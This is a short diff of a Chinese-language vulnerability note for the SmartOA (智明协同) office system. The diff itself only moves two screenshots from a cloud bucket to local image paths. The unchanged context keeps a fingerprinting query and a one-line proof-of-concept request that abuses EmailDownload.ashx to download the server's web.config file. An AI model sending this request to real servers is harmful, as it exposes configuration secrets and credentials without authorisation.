@@ -20,7 +20,7 @@ app="智明协同-SmartOA"
 
 登录页面
 
-![image-20220520133519986](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201335202.png)
+![image-20220520133519986](./images/202205201335202.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="智明协同-SmartOA"
 /file/EmailDownload.ashx?url=~/web.config&name=web.config
 ```
 
-![image-20220520133538762](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201335862.png)
+![image-20220520133538762](./images/202205201335862.png)
